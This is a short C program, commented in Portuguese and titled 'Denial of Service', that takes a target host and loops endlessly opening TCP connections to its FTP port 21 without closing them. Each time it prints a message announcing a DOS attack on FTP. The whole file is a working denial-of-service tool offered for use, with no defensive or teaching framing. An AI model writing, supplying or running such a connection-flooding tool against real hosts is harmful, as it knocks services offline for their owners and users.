// Denial of Service

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main (int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("Usage: %s <host>",argv[0]);
	}

	else
	{
		// Variaveis
		int meusocket;
		int conecta;
		struct sockaddr_in alvo;
		char *destino = argv[1];
		char msg[] = "Realizando ataque DOS no FTP";
		
		while(1)
		{		
			// Tomada
			meusocket = socket(AF_INET, SOCK_STREAM, 0);

			// Alvo
			alvo.sin_family = AF_INET;
			alvo.sin_port = htons(21);
			alvo.sin_addr.s_addr = inet_addr(destino);

			// Conexao
			conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof (alvo));
			printf("%s\n", msg);
			fflush(stdout);
		}
	}
}
